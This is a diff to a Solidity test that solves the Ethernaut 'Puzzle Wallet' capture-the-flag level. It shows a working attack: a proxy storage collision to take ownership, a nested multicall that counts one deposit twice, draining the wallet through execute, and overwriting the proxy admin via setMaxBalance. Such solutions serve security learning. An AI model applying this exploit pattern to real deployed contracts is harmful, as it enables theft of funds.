@@ -1,6 +1,7 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
+import "forge-std/console.sol";
 import "../PuzzleWallet/PuzzleWalletFactory.sol";
 import "./utils/vm.sol";
 
@@ -10,7 +11,8 @@ contract PuzzleWalletTest is DSTest {
 
     // Memory cannot hold dynamic byte arrays must be storage
     bytes[] depositData = [abi.encodeWithSignature("deposit()")];
-    bytes[] multicallData = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];
+    bytes[] multicallData =
+        [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];
 
     event IsTrue(bool answer);
 
@@ -28,39 +30,32 @@ contract PuzzleWalletTest is DSTest {
         (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
         PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
         PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));
-        
+
         vm.startPrank(eoaAddress);
-        
+
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
-        emit log_address(ethernautPuzzleProxy.admin());
-        emit log_address(ethernautPuzzleWallet.owner());
+        bytes[] memory depositSelector = new bytes[](1);
+        depositSelector[0] = abi.encodeWithSelector(ethernautPuzzleWallet.deposit.selector);
+
+        bytes[] memory nestedMulticall = new bytes[](2);
+        nestedMulticall[0] = depositSelector[0];
+        nestedMulticall[1] = abi.encodeWithSelector(ethernautPuzzleWallet.multicall.selector, depositSelector);
 
         ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
-        emit log_address(ethernautPuzzleWallet.owner());
 
-        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
         ethernautPuzzleWallet.addToWhitelist(eoaAddress);
-        ethernautPuzzleWallet.addToWhitelist(levelAddressWallet);
-        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
 
-        // Call multicall with multicallData above enables us to double deposit 
-        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);
+        ethernautPuzzleWallet.multicall{value: 1 ether}(nestedMulticall);
 
-        // Withdraw funds so balance of contract is 0 
-        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, bytes(""));
+        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, "");
 
-        // Check who current admin is of proxy
-        assertTrue((ethernautPuzzleProxy.admin() != eoaAddress));
+        console.log(address(ethernautPuzzleWallet).balance);
 
-
-        // Set max balance to your address, there's no separation between the storage layer of the proxy 
-        // and the puzzle wallet - this means when you to maxbalance (slot 1) you also write to the proxy admin variable 
         ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));
 
-        
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
